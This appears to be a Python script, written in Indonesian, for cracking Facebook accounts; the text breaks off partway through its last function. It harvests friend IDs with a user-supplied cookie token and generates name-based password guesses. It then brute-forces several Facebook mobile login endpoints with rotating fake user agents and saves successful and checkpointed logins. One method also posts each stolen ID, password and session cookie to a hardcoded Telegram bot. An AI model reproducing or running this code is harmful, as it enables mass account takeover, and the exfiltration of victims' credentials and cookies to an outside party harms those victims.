#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[ GLOBAL NAME ]-------------------#
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
uidf=[]
full=[]
full2=[]
rr = random.randint
rc = random.choice
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
sys.stdout.write('\x1b]2;MOGA IJO OM\x07')
#------------------[ GLOBAL NAME ]-------------------#
for kon in range(2000):
	uu = ["SM-J200G","SM-J320H","SM-J500H","SM-G970U","SM-N950U","SM-N950F","SM-G975F","SM-N975W","SM-A305F","SM-A505F","SM-A750F","SM-G950F","SM-A107F","SM-G532F","SM-J700F","SM-J210F","SM-N920C","SM-J710MN","SM-G925W8"]
	versi = ["6.0.1","10","8","9","5.1.1","8.0.0","8.1.0","5.1.1","7.0","10.0","8.0","9.0","9.0.0","8.0.0","6.1.1","5.0.0","6","11","12.0","12","11.0","13.0","13","14","14.0.0"]
	uag = f"Mozilla/5.0 (Linux; Android {str(rc(versi))}; {str(rc(uu))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,150))}.0.{str(rr(2600,8999))}.{str(rr(50,250))} Mobile Safari/537.36"
	hah = random.choice([uag])
	full.append(hah)
#------------[ INDICATION ]---------------#
#------------[ WARNA-COLOR ]--------------#
x = '\x1b[1;97m' # PUTIH
u = '\x1b[38;5;92m' # UNGU
m = '\x1b[38;5;196m' # MERAH
b = '\x1b[38;5;51m' # BIRU
p = '\x1b[38;5;201m' # PINK
k = '\033[1;33m' # KUNING
h = '\x1b[38;5;46m' # HIJAU

M2 = "[#FF0000]" # MERAH
B2 = "[#0000CD]" # BIRU BIASA
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]"# KUNING
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JING
warna = random.choice([u,k,p,m])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'konyol-OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'konyol-CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()	
#------------------[ LOGO-LAKNAT ]-----------------#
def login_lagi334():
	try:		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'[{h}#{x}]Masukan Cookie  :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('[#]%sLogin Succes%s'%(h, p))

				else:
					print('[#]%sFailled Get Token%s'%(m, p))

			except:
				print('[#] Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
#----------------[ BAGIAN-MENU ]----------------#
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[+] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	print('==============================')
	print(f'(1) Crack Publik')
	print(f'(0) Keluar')
	RIPAL = input(f'[#] Pilih Menu Crack : ')
	if RIPAL in ['1']:
		massal()
	elif RIPAL in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'[+] {m}Sukses Logout+Hapus Cookies')
		time.sleep(5)
		login()
	else:
		print('[+] Pilih Yang Bener Asu ')
		exit()

def massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'[#] Mau Berapa ID ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'[#] ID Ke  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print("[#] Total Id  : "+str(len(id))) 
	      setting()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()				
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():   
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	print(f'{x}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')		
	print(f'[{h}1{x}] VALIDATE ')
	print(f'[{h}2{x}] REGULER ')
	print(f'[{h}3{x}] ASYNC ')
	hc = input(f'{x}[{h}#{x}] Pilih : ')
	if hc in ['1','01']:
		method.append('validate1')
	elif hc in ['2','02']:
		method.append('reguler')
	elif hc in ['3','03']:
	    method.append('async')
	else:
		method.append('validate1')
	print(f'{x}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')	
	_brayen_ = input(f'{x}[{h}#{x}] TAMPILKAN APK ? Y/T : ')
	if _brayen_ in ['']:
		print(f'{x}[{h}#{x}] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	_brayen_ = input(f'{x}[{h}#{x}] TAMPILKAN OPSI CP ? Y/T : ')
	if _brayen_ in ['']:
		print(f'{x}[{h}#{x}] Pilih Yang Bener Kontol ')
		exit()
	elif _brayen_ in ['y','Y']:
		gabriel.append('ya')
	else:
		gabriel.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(" ")[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(frs+'12')
						pwv.append(frs+'21')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				if 'validate1' in method:
					pool.submit(validate1,idf,pwv)
				elif 'reguler' in method:
					pool.submit(reguler,idf,pwv)
				elif 'async' in method:
					pool.submit(crackasync,idf,pwv)				
				else:
					pool.submit(validate1,idf,pwv)
		print('')
	print(f'{x}[{h}#{x}] OK : {h}{ok}  [+] CP : {k}{cp} ')
#-----------------------[ METHOD VALIDATE ]--------------------#
def validate1(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"[#]{J2}VALIDATE{P2}( {len(id2)} ) {H2}Live {P2}: {H2}{(ok)} {K2}Check {P2}: {K2}{(cp)} {P2}({H2}{str(idf)}{P2}){P2}({J2}{(loop)}{P2})",)
	prog.advance(des)
	for pw in pwv:
		try:
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			link = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=link, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METHOD REGULER ]--------------------#
def reguler(idf,pwv):
	global loop,ok,cp
	ua = random.choice(ugen)
	ses = requests.Session()
	prog.update(des,description=f"[#]{J2}REGULER{P2}( {len(id2)} ) {H2}Live {P2}: {H2}{(ok)} {K2}Check {P2}: {K2}{(cp)} {P2}({H2}{str(idf)}{P2}){P2}({J2}{(loop)}{P2})",)
	prog.advance(des)
	for pw in pwv:
		try:
			p = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1862952583919182%26cbt%3D1706984989875%26e2e%3D%257B%2522init%2522%253A1706984989875%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D0c7cd582-980e-4922-965f-905e9bba5e95%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ss.android.ugc.trill%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DppY5erh7Rg_sY_miJbHCzMUqIjNLrNgHiX506taShzs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D958f88bc-6235-419c-856c-f501e72d7380%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa = {
			'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),
			'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
			'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1),
			'try_number': '0',
			'unrecognized_tries': '0',
			'email': idf,
			'pass': pw,
			'login': 'Masuk',
			'prefill_contact_point': '',
			'prefill_source': '',
			'prefill_type': '',
			'first_prefill_source': '',
			'first_prefill_type': '',
			'had_cp_prefilled': 'false',
			'had_password_prefilled': 'false',
			'is_smart_lock': 'false',
			'bi_xrwh': '0',
			}
			heade = {
			'Host': 'm prod.facebook.com',
			'content-length': '{str(rr(100,355))}',
			'cache-control': 'max-age=0',
			'dpr': '1.600000023841858',
			'viewport-width': '{str(rr(800,980))}',
			'sec-ch-ua': '''Not;A=Brand";v="{str(rr(1,99))}", "Chromium";v="{str(rr(50,120))}''',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': "Android",
			'sec-ch-ua-platform-version': "{str(rr(11,99))}.0.0",
			'sec-ch-ua-full-version-list': '''Not;A=Brand";v="{str(rr(1,99))}.0.0.0", "Chromium";v="{str(rr(50,120))}.0.{str(rr(5000,6099))}.{str(rr(50,116))}''',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://m.prod.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1862952583919182%26cbt%3D1706984989875%26e2e%3D%257B%2522init%2522%253A1706984989875%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D0c7cd582-980e-4922-965f-905e9bba5e95%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ss.android.ugc.trill%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DppY5erh7Rg_sY_miJbHCzMUqIjNLrNgHiX506taShzs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D958f88bc-6235-419c-856c-f501e72d7380%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			po = ses.post('https://m.prod.facebook.com/login/device-based/regular/login/?api_key=1862952583919182&auth_token=928cd228a2dd7a7d6dcd3c150670f26e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1862952583919182%26cbt%3D1706984989875%26e2e%3D%257B%2522init%2522%253A1706984989875%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D0c7cd582-980e-4922-965f-905e9bba5e95%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ss.android.ugc.trill%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DppY5erh7Rg_sY_miJbHCzMUqIjNLrNgHiX506taShzs%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D958f88bc-6235-419c-856c-f501e72d7380%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522958f88bc-6235-419c-856c-f501e72d7380%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522i6qu03huh11iadcn3t4p%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[+] ID       : {idf}\n[+] PASSWORD : {pw}\n[+] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					requests.post(f"https://api.telegram.org/bot6507468448:AAHu5-HmGb16POwmFKDMT7KGDpZg--akWe4/sendMessage?chat_id=6356364399&text={idf}|{pw}    RESULT CP").json()
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[+] ID       : {idf}\n[+] PASSWORD : {pw}\n[+] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='RIPAL XD-CP')
					cetak(statuscp1)
					requests.post(f"https://api.telegram.org/bot6507468448:AAHu5-HmGb16POwmFKDMT7KGDpZg--akWe4/sendMessage?chat_id=6356364399&text={idf}|{pw}    RESULT CP").json()
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[+] ID       : {idf}\n[+] PASSWORD : {pw}\n[+] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					requests.post(f"https://api.telegram.org/bot6507468448:AAHu5-HmGb16POwmFKDMT7KGDpZg--akWe4/sendMessage?chat_id=6356364399&text={idf}|{pw}|{kuki}    RESULT OK").json()
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[+] ID       : {idf}\n[+] PASSWORD : {pw}\n[+] COOKIES  : {kuki}\n[•] USERAGENT : {ua} '
					statusok1 = nel(statusok, width=90, style='bold green', title='RIPAL XD-OK')
					cetak(statusok1)
					requests.post(f"https://api.telegram.org/bot6507468448:AAHu5-HmGb16POwmFKDMT7KGDpZg--akWe4/sendMessage?chat_id=6356364399&text={idf}|{pw}|{kuki}    RESULT OK").json()
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE ASYNC ]--------------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	ua = random.choice(full)
	ses = requests.Session()
	prog.update(des,description=f"[#]{J2}ASYNC{P2}( {len(id2)} ) {H2}Live {P2}: {H2}{(ok)} {K2}Check {P2}: {K2}{(cp)} {P2}({H2}{str(idf)}{P2}){P2}({J2}{(loop)}{P2})",)
	prog.advance(des)
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=366497233413324&kid_directed_site=0&app_id=366497233413324&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D366497233413324%26redirect_uri%3Dhttps%253A%252F%252Fwww.99.co%252Fid%252Fapi%252Fbiz%252Fauth%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De6ee5c4f-e11f-4a4d-bfd8-22c1beda2874%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.99.co%2Fid%2Fapi%2Fbiz%2Fauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
